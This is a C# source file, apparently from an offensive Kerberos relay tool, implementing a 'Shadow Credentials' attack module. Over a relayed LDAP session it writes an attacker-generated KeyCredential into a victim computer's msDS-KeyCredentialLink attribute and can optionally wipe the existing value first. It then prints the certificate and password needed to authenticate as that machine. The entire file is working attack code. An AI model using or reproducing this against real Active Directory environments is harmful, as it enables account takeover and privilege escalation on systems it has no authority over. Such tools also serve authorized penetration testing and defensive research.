using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Linq;
using DSInternals.Common.Data;
using static RemoteKrbRelay.Helpers.Natives;

namespace RemoteKrbRelay.Relay.Attacks.Ldap
{
    class ShadowCred
    {
        public static LdapStatus attack(IntPtr ld)
        {
            var dn = Options.victimDN;
            if (string.IsNullOrEmpty(dn))
            {
                dn = Generic.getMachineDN(ld, new string(Options.victim.TakeWhile(c => c != '.').ToArray()));
                if (string.IsNullOrEmpty(dn))
                {
                    Console.WriteLine($"[-] Cant get DN of {Options.victim}. Trying to guess it (otherwise u can specify it using --victimdn)");
                    dn = $"CN={new string(Options.victim.TakeWhile(c => c != '.').ToArray())},CN=Computers,{Options.domainDN}";
                    //Debug.WriteLine($"[?] Is it correct? {dn}");
                }
            }
            Console.WriteLine($"[?] Using dn {dn}");
            Console.WriteLine("[+] Generating certificate");
            X509Certificate2 cert = GenerateSelfSignedCert(dn);
            Console.WriteLine("[+] Certificate generated");
            Console.WriteLine("[+] Generating KeyCredential");
            Guid guid = Guid.NewGuid();
            KeyCredential keyCredential = new KeyCredential(cert, guid, dn, DateTime.Now);
            Console.WriteLine("[+] KeyCredential generated with DeviceID {0}", guid.ToString());
            if (Options.forceShadowCred)
            {
                Console.WriteLine("[+] Clearing msDS-KeyCredentialLink before adding our new KeyCredential");
                Generic.clearAttribute(ld, "msDS-KeyCredentialLink", dn);
            }
            LdapStatus ret = (RemoteKrbRelay.Helpers.Natives.LdapStatus)Generic.setAttribute(ld, "msDS-KeyCredentialLink", Encoding.ASCII.GetBytes(keyCredential.ToDNWithBinary()), dn);

            if (ret != LdapStatus.LDAP_SUCCESS)
            {
                if ((!Options.forceShadowCred) && (ret == LdapStatus.LDAP_INSUFFICIENT_ACCESS))
                {
                    Console.WriteLine("[-] Got error 'LDAP_INSUFFICIENT_ACCESS' when trying to add new KeyCredential");
                    Console.WriteLine("    Could be due to an existing KeyCredential in computer object");
                    Console.WriteLine("    Try again with '--ForceShadowCred' flag to force overwrite it");
                    Environment.Exit(0);
                }
                return ret;
            }

            var shadowCredCertPass = Helpers.PasswordGenerator.GenerateSecurePassword(10);
           
            byte[] certBytes = cert.Export(X509ContentType.Pfx, shadowCredCertPass);
         
            Console.WriteLine("[+] KeyCredential added successfully");
            Console.WriteLine($"[+] Certificate: {Convert.ToBase64String(certBytes)}");
            Console.WriteLine($"[+] Certificate Password: {shadowCredCertPass}");
       

            Options.attackDone = true;

            return ret;
        }

        //Code taken from https://stackoverflow.com/questions/13806299/how-can-i-create-a-self-signed-certificate-using-c
        static X509Certificate2 GenerateSelfSignedCert(string cn)
        {
            RSA rsa = new RSACryptoServiceProvider(2048, new CspParameters(24, "Microsoft Enhanced RSA and AES Cryptographic Provider", Guid.NewGuid().ToString()));
            CertificateRequest req = new CertificateRequest($"cn={cn}", rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            X509Certificate2 cert = req.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
            return cert;
        }

    }
}